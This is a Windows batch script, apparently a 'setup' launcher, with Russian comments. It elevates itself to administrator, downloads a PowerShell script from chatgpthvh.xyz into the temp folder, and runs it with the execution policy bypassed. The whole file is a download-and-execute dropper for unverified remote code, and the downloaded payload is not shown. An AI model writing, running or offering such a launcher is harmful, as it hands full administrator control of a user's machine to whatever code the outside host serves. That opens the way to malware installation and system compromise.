@echo off
:: ставит в админку
:: мб нахуй надо? типо теперь он через curl в cmd просто ворк

set "PSURL=https://chatgpthvh.xyz/vm/setup.ps1"
set "TMPPS=%temp%\sb_setup.ps1"

NET SESSION >nul 2>&1
if %errorlevel% neq 0 (
  echo Requesting elevation...
  powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)

echo Running elevated launcher...

echo Downloading setup.ps1 from %PSURL% ...
powershell -NoProfile -Command ^
  "try { Invoke-WebRequest -Uri '%PSURL%' -OutFile '%TMPPS%' -UseBasicParsing -ErrorAction Stop; Write-Host 'Downloaded.' } catch { Write-Warning 'Invoke-WebRequest failed, trying curl'; try { curl '%PSURL%' -o '%TMPPS%'; Write-Host 'Downloaded via curl.' } catch { Write-Error 'Failed to download setup.ps1'; exit 2 } }"

if not exist "%TMPPS%" (
  echo [!] setup.ps1 not found in temp: %TMPPS%
  pause
  exit /b 1
)

echo Запускаем / Starting
powershell -NoProfile -ExecutionPolicy Bypass -File "%TMPPS%"

echo Done. Press any key to close.
pause >nul

